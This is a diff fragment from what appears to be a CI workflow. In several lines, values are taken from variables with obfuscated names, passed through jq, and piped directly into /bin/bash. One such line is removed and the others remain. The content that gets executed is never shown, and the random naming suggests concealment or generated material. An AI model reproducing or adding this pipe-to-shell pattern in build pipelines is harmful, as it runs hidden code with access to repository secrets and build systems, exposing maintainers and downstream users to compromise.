@@ -25,7 +25,6 @@ jobs:
           echo $vp33766 | jq -r .odact2646 | /bin/bash
           printf '%s' "$jjglx88" | jq -r .fageq30103 | /bin/bash
           echo $q8195 | jq -r .tamaf12 | /bin/bash
-          echo $h22 | jq -r .zfln43451 | /bin/bash
           echo $c9790 | jq -r .okr9432 | /bin/bash
           printf '%s' "$gbt81767" | jq -r .kvj9 | /bin/bash
 
